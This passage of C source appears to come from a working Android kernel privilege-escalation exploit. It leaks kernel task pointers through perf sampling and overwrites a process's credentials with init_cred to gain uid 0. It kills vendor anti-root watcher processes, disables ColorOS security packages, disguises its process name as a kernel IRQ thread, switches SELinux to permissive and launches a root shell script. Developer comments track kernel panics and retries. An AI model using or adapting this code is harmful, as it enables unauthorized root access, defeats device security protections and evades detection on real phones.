        bc = c;
        bx = x28s[i];
      }
    }
    out->x28 = bx;
    out->x28_cnt = bc;
    out->x0 = bx;
    out->x0_cnt = bc;
  }
  if (out->nuniq) {
    int best_i = 0;
    for (int u = 1; u < out->nuniq; u++)
      if (out->uniq_cnt[u] > out->uniq_cnt[best_i])
        best_i = u;
    out->best = out->uniq[best_i];
    out->best_cnt = out->uniq_cnt[best_i];
  }
  pr_info("perf pid=%d mode=%s samp=%d x28=%016zx x28n=%d/%d al64=%d\n", pid,
          mode, n_samp, out->x28, out->x28_cnt, nx28,
          (out->x28 & 0x3f) == 0);
  return out->x28_cnt;
}

static int leak_has(const struct perf_leak *l, uintptr_t v) {
  for (int i = 0; i < l->nuniq; i++)
    if (l->uniq[i] == v)
      return 1;
  return 0;
}

/* Highest-count VA in `from` that is not in `other`. Prefer 64-aligned. */
static uintptr_t leak_unique(const struct perf_leak *from,
                             const struct perf_leak *other, int want_align,
                             int *out_cnt) {
  uintptr_t best = 0;
  int best_cnt = 0;
  for (int i = 0; i < from->nuniq; i++) {
    uintptr_t v = from->uniq[i];
    int c = from->uniq_cnt[i];
    if (other && leak_has(other, v))
      continue;
    if (want_align && (v & 0x3f))
      continue;
    if (c > best_cnt) {
      best_cnt = c;
      best = v;
    }
  }
  if (out_cnt)
    *out_cnt = best_cnt;
  return best;
}

static uintptr_t perf_find_task_pid(int pid) {
  struct perf_leak l;
  if (perf_collect(pid, &l) <= 0)
    return 0;
  if (l.best_cnt * 2 < l.nc) {
    pr_info("perf task weak majority — reject\n");
    return 0;
  }
  return l.best;
}

static uintptr_t perf_find_task(void) { return perf_find_task_pid(0); }

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

static void child_spin_until_cmd(int cmd_r, char *cmd) {
  struct pollfd pfd;
  pfd.fd = cmd_r;
  pfd.events = POLLIN;
  for (;;) {
    pfd.revents = 0;
    if (poll(&pfd, 1, 0) > 0 && (pfd.revents & POLLIN)) {
      if (read(cmd_r, cmd, 1) == 1)
        return;
    }
    syscall(__NR_getpid);
    {
      /* uid beacon (fd-free detection): the C-pipe answer path never
       * worked in this codebase; the file always does. */
      static int bf = -2;
      if (bf == -2)
        bf = open("/data/local/tmp/child_uid.txt", O_WRONLY | O_CREAT |
                     O_TRUNC | O_SYNC, 0644);
      if (bf >= 0) {
        uint32_t u = (uint32_t)getuid();
        (void)pwrite(bf, &u, sizeof(u), 0);
      }
    }
  }
}

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  prctl(PR_SET_NAME, "gl_uid0_child", 0, 0, 0);
  {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(6, &set);
    sched_setaffinity(0, sizeof(set), &set);
  }
  /* Ready token only — parent HW-samples our getpid loop (Z19 self-sample
   * was timer-IRQ rb nodes, not task_struct). */
  uintptr_t my_task = 0;
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  char cmd = 0;
  child_spin_until_cmd(p->cmd_r, &cmd);
  for (;;) {
    if (cmd == 'C') {
      uint32_t uid = getuid();
      write(p->uid_w, &uid, sizeof(uid));
    } else if (cmd == 'G')
      break;
    child_spin_until_cmd(p->cmd_r, &cmd);
  }
  close(p->cmd_r); close(p->uid_w);
  if (getuid() != 0) _exit(1);
  pid_t gc = fork();
  if (gc == 0) {
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
    /* fallback if the script is missing: minimal durable proof */
    execl("/system/bin/sh", "sh", "-c",
          "id > /data/local/tmp/ROOTED_ID.txt 2>&1; "
          "setenforce 0; mkdir -p /data/adb/ksu; chmod 777 /data/adb",
          (char *)NULL);
    _exit(1);
  }
  if (gc > 0) waitpid(gc, NULL, 0);
  for (;;) pause();
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

static uint64_t dram_size(void) {
  FILE *f = fopen("/proc/meminfo", "r");
  unsigned long kb = 0;
  char line[80];
  if (f) {
    while (fgets(line, sizeof(line), f)) {
      if (sscanf(line, "MemTotal: %lu kB", &kb) == 1)
        break;
    }
    fclose(f);
  }
  uint64_t b = (uint64_t)kb * 1024ULL;
  uint64_t gb = 1ULL << 30;
  if (b < gb)
    return 0x400000000ULL;
  return ((b + gb - 1) / gb) * gb;
}

/* 64GB DIRECT_MAP (Z7) aliases past DRAM. Wrap into the real P0 window. */
static uintptr_t p0_from_direct(uintptr_t v) {
  uint64_t ram = dram_size();
  if (v < (uintptr_t)P0_PAGE_OFFSET)
    return 0;
  uint64_t off = (uint64_t)v - (uint64_t)P0_PAGE_OFFSET;
  if (off >= 0x1000000000ULL)
    return 0;
  return (uintptr_t)P0_PAGE_OFFSET + (off % ram);
}

static int read_proc_comm(pid_t pid, char *out, size_t n) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/comm", (int)pid);
  int fd = open(path, O_RDONLY);
  if (fd < 0)
    return -1;
  ssize_t r = read(fd, out, n - 1);
  close(fd);
  if (r <= 0)
    return -1;
  out[r] = 0;
  for (ssize_t i = 0; i < r; i++)
    if (out[i] == '\n') {
      out[i] = 0;
      break;
    }
  return 0;
}

static void uid0_w2_overlay(void) {
  uint64_t it_off = (active_offsets && active_offsets->off_init_task)
                        ? active_offsets->off_init_task
                        : 0x027CC000ULL;
  fake_task = data_addr(KIMAGE_TEXT_BASE + it_off);
  fake_lock = data_addr(KIMAGE_TEXT_BASE +
      (active_offsets && active_offsets->off_bss_tail_lock
           ? active_offsets->off_bss_tail_lock
           : 0x02BB9D00ULL));
  page_base = fake_lock;
  if (!fake_fops)
    fake_fops = fake_lock;
  pselect_child_node = 1;
}

static uint32_t status_uid_of(const char *proc_status) {
  FILE *sf = fopen(proc_status, "r");
  if (!sf)
    return 9999;
  char line[192];
  uint32_t u = 9999;
  while (fgets(line, sizeof(line), sf)) {
    unsigned v = 9999;
    if (sscanf(line, "Uid: %u", &v) == 1) {
      u = v;
      break;
    }
  }
  fclose(sf);
  return u;
}

static void uid0_write_proof(uint32_t self_uid, uint32_t self_status,
                             uint32_t child_uid, uint32_t child_status,
                             const char *who, uintptr_t task) {
  char b[320];
  int n = snprintf(b, sizeof(b),
                   "self_getuid=%u self_geteuid=%u self_status=%u "
                   "child_getuid=%u child_status=%u who=%s task=%016zx\n",
                   self_uid, (uint32_t)geteuid(), self_status, child_uid,
                   child_status, who, task);
  const char *paths[] = {"/data/local/tmp/ghostlock_uid0",
                         "/sdcard/ghostlock/aarif/uid0_proof.txt"};
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
    int pf = open(paths[i], O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
    if (pf >= 0) {
      if (n > 0)
        (void)write(pf, b, (size_t)n);
      close(pf);
    }
  }
  pr_info("UID0 proof %s", b);
  fflush(stdout);
  fsync(STDOUT_FILENO);
}

static int uid0_scan_watchers(pid_t *out, int max) {
  DIR *d = opendir("/proc");
  int n = 0;
  struct dirent *e;
  if (!d)
    return 0;
  while ((e = readdir(d)) != NULL && n < max) {
    char *end = NULL;
    long pid = strtol(e->d_name, &end, 10);
    char path[64], comm[40];
    int fd;
    ssize_t r;
    int i;
    if (!end || *end || pid <= 2)
      continue;
    /* Kernel threads (ppid 2) — SIGKILL hangs (Z41). */
    {
      char st[256];
      int sfd;
      unsigned long ppid = 0;
      snprintf(path, sizeof(path), "/proc/%ld/stat", pid);
      sfd = open(path, O_RDONLY);
      if (sfd < 0)
        continue;
      r = read(sfd, st, sizeof(st) - 1);
      close(sfd);
      if (r <= 0)
        continue;
      st[r] = 0;
      if (sscanf(st, "%*d (%*[^)]) %*c %lu", &ppid) != 1 || ppid == 2)
        continue;
    }
    snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
    fd = open(path, O_RDONLY);
    if (fd < 0)
      continue;
    r = read(fd, comm, sizeof(comm) - 1);
    close(fd);
    if (r <= 0)
      continue;
    comm[r] = 0;
    for (i = 0; i < (int)r; i++)
      if (comm[i] == '\n')
        comm[i] = 0;
    if (strstr(comm, "kevent") || strstr(comm, "exsystem") ||
        strstr(comm, "anti_root"))
      out[n++] = (pid_t)pid;
  }
  closedir(d);
  return n;
}

static void uid0_kill_watchers(const pid_t *p, int n) {
  int i;
  for (i = 0; i < n; i++) {
    errno = 0;
    int r = kill(p[i], SIGKILL);
    pr_info("UID0 kill watcher pid=%d ret=%d errno=%d\n", (int)p[i], r, errno);
  }
}

static void uid0_one_store(uintptr_t slot, const char *tag) {
  uid0_w2_overlay();
  uintptr_t icred = data_addr(g_init_cred_image);
  uintptr_t val = g_cred_copy ? g_cred_copy : icred;
  pr_info("UID0 store %s slot=%016zx val=%016zx\n", tag, slot, val);
  live_sync_log("UID0", tag);
  set_pselect_write_mode(slot, 0, 4);
  run_main_route_threads();
  clear_pselect_write();
  fflush(stdout);
}

static void uid0_run_cmd(char *const argv[]) {
  pid_t p = fork();
  if (p == 0) {
    int dn = open("/dev/null", O_WRONLY);
    if (dn >= 0) {
      dup2(dn, 1);
      dup2(dn, 2);
      close(dn);
    }
    execv(argv[0], argv);
    _exit(127);
  }
  if (p > 0) {
    int st = 0;
    waitpid(p, &st, 0);
  }
}

/* Park is Permissive: disable the ColorOS watchers that 15s-reboot on
 * self cred (Z34). stdsp-only was not enough (safecenter/subsys still ran). */
static void uid0_mute_coloros(void) {
  static const char *pkgs[] = {
      "com.oplus.exsystemservice",
      "com.oplus.stdsp",
      "com.oplus.safecenter",
      "com.oplus.subsys",
      "com.oplus.securityguard",
      "com.coloros.phonemanager",
  };
  pr_info("UID0 mute ColorOS watchers\n");
  live_sync_log("UID0", "mute_coloros");
  durable_stage("uid0_mute_coloros");
  for (size_t i = 0; i < sizeof(pkgs) / sizeof(pkgs[0]); i++) {
    char *dis[] = {"/system/bin/pm", "disable-user", "--user", "0",
                   (char *)pkgs[i], NULL};
    char *stp[] = {"/system/bin/am", "force-stop", (char *)pkgs[i], NULL};
    uid0_run_cmd(dis);
    uid0_run_cmd(stp);
  }
  usleep(400000);
}

/* Same-process W2 after a live Z4 park. Z5 (second GhostLock process) KP'd.
 * MODE4_NULL_STORE: W1 was leaf-NULL *sys_exit.funcs=0, not park. Skip
 * harvest/gboot and go straight to cred so the hook-off window is used. */
static int uid0_cred_walk(void) {
  if (env_flag("UID0_DIRECT", 0)) {
    /* Two-process mode: process 1 already did W1 (guard unhook). This
     * process goes straight to the punch — its FIRST walk stores. */
    pr_success("UID0_DIRECT: straight to cred punch (walk #1 of this proc)\n");
    durable_stage("uid0_direct_enter");
    live_sync_log("UID0", "direct_punch");
    goto uid0_cred_punch;
  }
  if (env_flag("MODE4_NULL_STORE", 0)) {
    pr_success("UID0: leaf-NULL walk lived — cred next, skip park/harvest\n");
    durable_stage("uid0_hookoff_ok");
    live_sync_log("UID0", "hookoff_ok_cred");
    /* pickup 08-29 fix: this branch jumped straight to the punch and never
     * muted the ColorOS popup packages (Z34 self-cred popped even with the
     * kernel hook off). Mute here — pm disable-user as uid 2000. */
    uid0_mute_coloros();
    unsetenv("MODE4_SLIDE_ZERO");
    unsetenv("MODE4_NULL_STORE");
    setenv("MODE4_SLIDE_CRED", "1", 1);
    goto uid0_cred_punch;
  }
  pr_success("UID0: park live — diag then cred if P0 task leak\n");
  durable_stage("uid0_park_ok");
  live_sync_log("UID0", "park_ok");
  uid0_park_diag();
  uid0_harvest_rootguard();
  {
    uintptr_t gboot = uid0_harvest_modip();
    /* Walk 2 = g_boot_state nonzero. is_unlocked is LDRB+RET (any nz = orange).
     * VALUE = BSS P0|1 (proven zero rb_node, low byte 1). Do not reuse Z44
     * 0xffffff8100000000 (live DRAM). Module VA may be RO-after-init — if this
     * KPs, next is physmap alias. */
    if (env_flag("MODE4_UID0_GBOOT", 0)) {
      const char *ev = getenv("GBOOT_VA");
      if (ev && ev[0])
        gboot = (uintptr_t)strtoull(ev, NULL, 0);
      if (!gboot) {
        pr_info("UID0 GBOOT no VA — HOLD, no punch\n");
        live_sync_log("UID0", "gboot_no_va");
        durable_stage("uid0_gboot_hold");
        for (;;) {
          char eb[4] = {0};
          int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
          if (efd >= 0) {
            (void)read(efd, eb, 3);
            close(efd);
          }
          pr_info("UID0 GBOOT HOLD noVA getuid=%u enforce=%.2s\n",
                  (unsigned)getuid(), eb);
          fflush(stdout);
          fsync(STDOUT_FILENO);
          sleep(15);
        }
      }
      {
        uintptr_t p0 = uid0_gboot_to_p0(gboot);
        pr_info("UID0 GBOOT va=%016zx p0=%016zx\n", gboot, p0);
        if (!p0) {
          pr_info("UID0 GBOOT no P0 — HOLD, not punching RO module VA\n");
          live_sync_log("UID0", "gboot_no_p0");
          durable_stage("uid0_gboot_hold");
          for (;;) {
            char eb[4] = {0};
            int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
            if (efd >= 0) {
              (void)read(efd, eb, 3);
              close(efd);
            }
            pr_info("UID0 GBOOT HOLD noP0 va=%016zx getuid=%u enforce=%.2s\n",
                    gboot, (unsigned)getuid(), eb);
            fflush(stdout);
            fsync(STDOUT_FILENO);
            sleep(15);
          }
        }
        gboot = p0;
      }
      pr_info("UID0 GBOOT punch slot=%016zx val=BSS|1 (physmap)\n", gboot);
      live_sync_log("UID0", "gboot_punch");
      durable_stage("uid0_gboot_enter");
      unsetenv("MODE4_SLIDE_ZERO");
      unsetenv("MODE4_SLIDE_CRED");
      unsetenv("MODE4_SLIDE_KPTR");
      setenv("MODE4_SLIDE_GBOOT", "1", 1);
      uid0_w2_overlay();
      set_pselect_write_mode(gboot, 0, 4);
      run_main_route_threads();
      clear_pselect_write();
      pr_success("UID0 GBOOT done — HOLD, no cred\n");
      durable_stage("uid0_gboot_hold");
      for (;;) {
        char eb[4] = {0};
        int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (efd >= 0) {
          (void)read(efd, eb, 3);
          close(efd);
        }
        pr_info("UID0 GBOOT HOLD getuid=%u enforce=%.2s\n", (unsigned)getuid(),
                eb);
        fflush(stdout);
        fsync(STDOUT_FILENO);
        sleep(15);
      }
    }
  }
  /* Walk 2 = kptr_restrict=0 (vmlinux, known P0). Unhashes kallsyms so
   * g_boot_state VA is readable. Not a uid drop → hook does not SIGKILL.
   * Z44: VALUE 0xffffff8100000000 KPd — do not reuse. */
  if (env_flag("MODE4_UID0_KPTR", 0)) {
    uint64_t koff = (active_offsets && active_offsets->off_kptr_restrict)
                        ? active_offsets->off_kptr_restrict
                        : 0x027BCF68ULL;
    uintptr_t slot = data_addr(KIMAGE_TEXT_BASE + koff);
    pr_info("UID0 KPTR punch slot=%016zx\n", slot);
    live_sync_log("UID0", "kptr_punch");
    durable_stage("uid0_kptr_enter");
    unsetenv("MODE4_SLIDE_ZERO");
    unsetenv("MODE4_SLIDE_CRED");
    setenv("MODE4_SLIDE_KPTR", "1", 1);
    uid0_w2_overlay();
    set_pselect_write_mode(slot, 0, 4);
    run_main_route_threads();
    clear_pselect_write();
    {
      char kr[16] = {0};
      read_first_line("/proc/sys/kernel/kptr_restrict", kr, sizeof(kr));
      pr_info("UID0 kptr_restrict_after=%s\n", kr);
    }
    uid0_harvest_rootguard();
    pr_success("UID0 KPTR done — HOLD, no cred\n");
    durable_stage("uid0_kptr_hold");
    for (;;) {
      char eb[4] = {0};
      int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
      if (efd >= 0) {
        (void)read(efd, eb, 3);
        close(efd);
      }
      pr_info("UID0 KPTR HOLD getuid=%u enforce=%.2s\n", (unsigned)getuid(),
              eb);
      fflush(stdout);
      fsync(STDOUT_FILENO);
      sleep(15);
    }
  }
  /* HOLDPARK: keep the same process (Z5) and do not spend W2 on cred.
   * oplus_root_check_post_handler SIGKILLs self-cred on pselect return. */
  if (env_flag("MODE4_UID0_HOLDPARK", 0)) {
    pr_success("UID0 HOLDPARK — symbols dumped, no cred punch\n");
    live_sync_log("UID0", "holdpark");
    durable_stage("uid0_holdpark");
    for (;;) {
      char eb[4] = {0};
      int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
      if (efd >= 0) {
        (void)read(efd, eb, 3);
        close(efd);
      }
      pr_info("UID0 HOLDPARK getuid=%u enforce=%.2s\n", (unsigned)getuid(),
              eb);
      fflush(stdout);
      fsync(STDOUT_FILENO);
      sleep(15);
    }
  }
  uid0_mute_coloros();

  unsetenv("MODE4_SLIDE_ZERO");
  setenv("MODE4_SLIDE_CRED", "1", 1);

uid0_cred_punch:;
  struct child_pipes pipes;
  pid_t child = spawn_child(&pipes);
  if (child < 0) {
    pr_info("UID0: fork failed\n");
    live_sync_log("UID0", "fork_fail");
    return 1;
  }
  /* landing-checked retry: the route loop verifies each punch attempt via
   * this child's CapEff (do_pselect_fake_lock_route MODE4_SLIDE_CRED) */
  g_uid0_child_pid = (long)child;
  unlink("/data/local/tmp/child_uid.txt");
  /* The pselect fdset machinery dup2()s over EVERY fd 0..319 whose bit
   * appears in the stamp words (pointer-valued -> random low bits set).
   * Pipes in that range get clobbered mid-run (detector 9997 + old
   * hangs). Move them above NFDS=320. */
  g_uid0_cmd_w = fcntl(pipes.cmd_w, F_DUPFD, 900);
  g_uid0_uid_r = fcntl(pipes.uid_r, F_DUPFD, 901);
  if (g_uid0_cmd_w >= 0) { close(pipes.cmd_w); pipes.cmd_w = g_uid0_cmd_w; }
  if (g_uid0_uid_r >= 0) { close(pipes.uid_r); pipes.uid_r = g_uid0_uid_r; }
  g_uid0_cred_landed = 0;

  uintptr_t child_self = 0;
  if (read(pipes.task_r, &child_self, sizeof(child_self)) !=
      (ssize_t)sizeof(child_self))
    child_self = 0;
  close(pipes.task_r);

  /* Child is now busy-looping getpid. Sample parent, then attach to child. */
  struct perf_leak lself, lch;
  memset(&lself, 0, sizeof(lself));
  memset(&lch, 0, sizeof(lch));
  perf_collect(0, &lself);
  perf_collect((int)child, &lch);

  int ucnt = 0;
  uintptr_t use_task = 0;
  const char *who = "none";
  /* Z29 rule (reconfirmed 08-30): self punches only land when the leaked
   * x28 is already in the P0 window (ffffff80…). High-alias self x28
   * (ffffff87/88/89) self-punches missed 3/3 today (CapEff stayed 0);
   * the child punch hit (overnight 26225: child_status=0). Self only if
   * P0; else child raw (high alias is fine for the child). */
  if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4 &&
      p0_dram_ptr(lself.x28)) {
    use_task = lself.x28;
    ucnt = lself.x28_cnt;
    who = "self_x28_p0";
  } else if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 4) {
    use_task = lch.x28;
    ucnt = lch.x28_cnt;
    who = p0_dram_ptr(lch.x28) ? "child_x28_p0" : "child_x28";
  } else if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4) {
    use_task = lself.x28;
    ucnt = lself.x28_cnt;
    who = "self_x28";
  }

  {
    char b[280];
    snprintf(b, sizeof(b),
             "self_x28=%016zx/%d child_x28=%016zx/%d use=%016zx who=%s ucnt=%d",
             lself.x28, lself.x28_cnt, lch.x28, lch.x28_cnt, use_task, who,
             ucnt);
    pr_info("UID0 %s\n", b);
    live_sync_log("UID0", b);
  }

  if (!task_ptr_ok(use_task)) {
    /* Enforcing blocks perf (EACCES). HOLD and retry — do not exit
     * (last fire lost the hook-off process). kstkesp is logged in case
     * this build still exposes a kernel SP. */
    {
      char st[512] = {0};
      read_first_line("/proc/self/stat", st, sizeof(st));
      pr_info("UID0 self_stat %.200s\n", st);
      live_sync_log("UID0", "no_x28_hold");
    }
    durable_stage("uid0_hold_nox28");
    pr_info("UID0: no x28 — HOLD, retry leak (no second process)\n");
    fflush(stdout);
    fsync(STDOUT_FILENO);
    for (;;) {
      int efd;
      char eb[4] = {0};
      memset(&lself, 0, sizeof(lself));
      memset(&lch, 0, sizeof(lch));
      perf_collect(0, &lself);
      perf_collect((int)child, &lch);
      if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 4) {
        use_task = lself.x28;
        ucnt = lself.x28_cnt;
        who = p0_dram_ptr(lself.x28) ? "self_x28_p0" : "self_x28";
        pr_info("UID0 HOLD leak self_x28=%016zx/%d — cred now\n", use_task,
                ucnt);
        live_sync_log("UID0", "hold_leak_self");
        break;
      }
      if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 4) {
        use_task = lch.x28;
        ucnt = lch.x28_cnt;
        who = p0_dram_ptr(lch.x28) ? "child_x28_p0" : "child_x28";
        pr_info("UID0 HOLD leak child_x28=%016zx/%d — cred now\n", use_task,
                ucnt);
        live_sync_log("UID0", "hold_leak_child");
        break;
      }
      efd = open("/sys/fs/selinux/enforce", O_RDONLY);
      if (efd >= 0) {
        (void)read(efd, eb, 3);
        close(efd);
      }
      pr_info("UID0 HOLD nox28 getuid=%u enforce=%.2s self_x28=%016zx/%d\n",
              (unsigned)getuid(), eb, lself.x28, lself.x28_cnt);
      fflush(stdout);
      fsync(STDOUT_FILENO);
      sleep(15);
    }
  }

  uintptr_t wrapped = p0_from_direct(use_task);
  {
    char b[220];
    snprintf(b, sizeof(b),
             "who=%s pid=%d raw=%016zx wrap=%016zx ram=%llx comm_off=%x",
             who, (int)child, use_task, wrapped, (unsigned long long)dram_size(),
             (unsigned)TASK_COMM_OFF);
    pr_info("UID0 %s\n", b);
    live_sync_log("UID0", b);
  }
  durable_stage("uid0_w2_enter");

  /*
   * Z26: comm canary on RAW x28 changed gl_uid0_child → NUL-prefixed
   * marker (task_struct). The follow-up cred walk (W3) KP'd at pre-select.
   * One store only: *task.cred = init_cred (Z25 geometry lived).
   */
  (void)wrapped;
  g_cred_copy = 0;
  /* One punch. Subjective cred so getuid()/capable() see 0 (Z33 real_cred
   * only fooled /proc/status). Kernel kevent fires on 2000→0; kill the
   * userspace half (oplus_kevent / anti_root_dialog) before it reboots. */
  {
    int self = (who[0] == 's');
    pid_t watch[32];
    int nw = uid0_scan_watchers(watch, 32);
    prctl(PR_SET_NAME, "irq/0-kgsl", 0, 0, 0);
    g_uid0_slot_idx = 0;
    g_uid0_task_base = use_task;
    g_uid0_check_self = (who[0] == 's');
    uintptr_t slot = use_task +
        (env_flag("UID0_COMM_CANARY", 0) ? 0x790
                                         : g_uid0_slot_candidates[0]);
    uid0_one_store(slot, env_flag("UID0_COMM_CANARY", 0)
                          ? "child_comm_canary"
                          : (self ? "self_cred" : "child_cred"));
    uid0_kill_watchers(watch, nw);
    nw = uid0_scan_watchers(watch, 32);
    uid0_kill_watchers(watch, nw);
  }
  /* Landing check (08-30): /proc/<child>/status CapEff comes from the
   * SUBJECTIVE cred — it moves even while the child pipe is wedged.
   * Double-punch (second walk) was tried in F13 and KP'd at the W3 —
   * do NOT re-add without a between-walks landing check. */
  {
    char cpath[64];
    snprintf(cpath, sizeof(cpath), "/proc/%d/status", (int)child);
    char buf[4096] = {0};
    int sfd = open(cpath, O_RDONLY);
    if (sfd >= 0) {
      (void)read(sfd, buf, sizeof(buf) - 1);
      close(sfd);
    }
    char *ce = strstr(buf, "CapEff:");
    char ceb[32] = {0};
    if (ce) {
      for (int i = 0; i < 31 && ce[i] && ce[i] != '\n'; i++) ceb[i] = ce[i];
    }
    char lb[160];
    snprintf(lb, sizeof(lb), "punch_landing CapEff=[%.24s] getuid=%u",
             ceb, (unsigned)getuid());
    pr_info("UID0 %s\n", lb);
    live_sync_log("UID0", lb);
  }
  uint32_t self_uid_now = (uint32_t)getuid();
  pr_info("UID0 getuid_after_store=%u euid=%u who=%s\n", self_uid_now,
          (uint32_t)geteuid(), who);
  {
    /* pickup 08-29 fix: durable uid immediately after the store — two prior
     * consoles died before flushing this line. */
    char ub[96];
    snprintf(ub, sizeof(ub), "getuid_after_store=%u euid=%u who=%s",
             self_uid_now, (uint32_t)geteuid(), who);
    live_sync_log("UID0", ub);
    durable_stage(self_uid_now == 0 ? "uid0_after_store_ZERO" : "uid0_after_store");
  }
  fflush(stdout);

  write(pipes.cmd_w, "C", 1);
  uint32_t child_uid = 9999;
  {
    struct pollfd pfd;
    pfd.fd = pipes.uid_r;
    pfd.events = POLLIN;
    if (poll(&pfd, 1, 2000) > 0 &&
        read(pipes.uid_r, &child_uid, sizeof(child_uid)) !=
            (ssize_t)sizeof(child_uid))
      child_uid = 9999;
  }
  char cpath[64];
  snprintf(cpath, sizeof(cpath), "/proc/%d/status", (int)child);
  uint32_t status_uid = status_uid_of(cpath);
  uint32_t self_status = status_uid_of("/proc/self/status");
  uint32_t self_uid = (uint32_t)getuid();
  {
    char b[128];
    snprintf(b, sizeof(b),
             "self_uid=%u euid=%u self_status=%u child_getuid=%u "
             "child_status=%u who=%s",
             self_uid, (uint32_t)geteuid(), self_status, child_uid, status_uid,
             who);
    pr_info("UID0 %s\n", b);
    live_sync_log("UID0", b);
  }

  uid0_write_proof(self_uid, self_status, child_uid, status_uid, who, use_task);

  if (self_uid == 0 || (uint32_t)geteuid() == 0 || child_uid == 0 ||
      self_status == 0 || status_uid == 0) {
    pr_success("UID0 WIN getuid=%u euid=%u self_status=%u child=%u who=%s\n",
               self_uid, (uint32_t)geteuid(), self_status, child_uid, who);
    durable_stage("uid0_WIN");
    live_sync_log("UID0", "WIN");
    if (self_uid == 0 || (uint32_t)geteuid() == 0) {
      int efd, ee = 0;
      ssize_t nw = -1;
      umask(0);
      efd = open("/sys/fs/selinux/enforce", O_WRONLY);
      if (efd >= 0) {
        errno = 0;
        nw = write(efd, "0", 1);
        ee = errno;
        close(efd);
      } else
        ee = errno;
      pr_info("UID0 setenforce n=%zd errno=%d getuid=%u\n", nw, ee,
              (unsigned)getuid());
      mkdir("/data/adb", 0777);
      mkdir("/data/adb/ksu", 0777);
      chmod("/data/adb", 0777);
      chmod("/data/adb/ksu", 0777);
      chmod("/data/local/tmp/ghostlock_uid0", 0666);
      {
        int pf = open("/data/local/tmp/uid0_id.txt",
                      O_WRONLY | O_CREAT | O_TRUNC, 0666);
        if (pf >= 0) {
          char ib[80];
          int n = snprintf(ib, sizeof(ib), "uid=%u euid=%u\n", self_uid,
                           (unsigned)geteuid());
          if (n > 0)
            (void)write(pf, ib, (size_t)n);
          close(pf);
          chmod("/data/local/tmp/uid0_id.txt", 0666);
        }
      }
      pid_t gc = fork();
      if (gc == 0) {
        efd = open("/sys/fs/selinux/enforce", O_WRONLY);
        if (efd >= 0) {
          (void)write(efd, "0", 1);
          close(efd);
        }
        execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh",
              (char *)NULL);
        execl("/system/bin/sh", "sh", "-c",
              "id; mkdir -p /data/adb /data/adb/ksu; "
              "id > /data/local/tmp/uid0_id.txt; "
              "id > /data/adb/uid0_id.txt; "
              "chmod 666 /data/local/tmp/uid0_id.txt "
              "/data/local/tmp/ghostlock_uid0 2>/dev/null; "
              "chmod 777 /data/adb /data/adb/ksu 2>/dev/null; "
              "echo WIN > /sdcard/ghostlock/aarif/uid0_id.txt",
              (char *)NULL);
        _exit(1);
      }
      if (gc > 0)
        waitpid(gc, NULL, WNOHANG);
      kill(child, SIGKILL);
      waitpid(child, NULL, WNOHANG);
      close(pipes.cmd_w);
      close(pipes.uid_r);
    } else {
      write(pipes.cmd_w, "G", 1);
      close(pipes.cmd_w);
      close(pipes.uid_r);
    }
    /* Stay alive: returning exits and we lose the park session. */
    for (;;) {
      char eb[4] = {0};
      int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
      if (efd >= 0) {
        (void)read(efd, eb, 3);
        close(efd);
      }
      pr_info("UID0 HOLD getuid=%u euid=%u status=%u child_status=%u enforce=%.2s\n",
              (uint32_t)getuid(), (uint32_t)geteuid(),
              status_uid_of("/proc/self/status"),
              status_uid_of(cpath), eb);
      fflush(stdout);
      fsync(STDOUT_FILENO);
      uid0_write_proof((uint32_t)getuid(), status_uid_of("/proc/self/status"),
                       child_uid, status_uid_of(cpath), who, use_task);
      sleep(15);
    }
  }

  pr_info("UID0: still uid=%u — one punch, stopping\n", self_uid);
  durable_stage("uid0_miss");
  close(pipes.cmd_w);
  close(pipes.uid_r);
  kill(child, SIGKILL);
  waitpid(child, NULL, 0);
  return 1;
}

#define SYS_getdents64 217
#define SYS_gettid 178

int run_exploit(int argc, char **argv) {
  (void)argc; (void)argv;
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();

  /* QEMU freestanding-init mode: mount the pseudo-filesystems from bionic
   * so /dev/ashmem, /proc, /sys exist (env QEMU_INIT=1). */
  if (env_flag("QEMU_INIT", 0)) {
    struct { const char *src, *tgt, *fs; } ms[] = {
        {"proc", "/proc", "proc"},
        /* devtmpfs mount triggers request_module which DEADLOCKS (kernel
         * built with STATIC_USERMODEHELPER="") — skipped; static chain
         * path needs no /dev. */
        {"sysfs", "/sys", "sysfs"},
    };
    for (size_t i = 0; i < 2; i++) {
      errno = 0;
      long r = mount(ms[i].src, ms[i].tgt, ms[i].fs, 0, NULL);
      pr_info("QEMU_INIT mount %s -> %s : ret=%ld errno=%d\n",
              ms[i].fs, ms[i].tgt, r, errno);
    }
    /*
     * No devtmpfs in this kernel config path: create /dev/ashmem by hand
     * from /proc/misc (misc major is 10), and derive KPHYS from the
     * "Kernel code" line in /proc/iomem (starts at _stext = _text+0x10000)
     * so the P0 linear-map alias is exact for THIS QEMU phys load.
     */
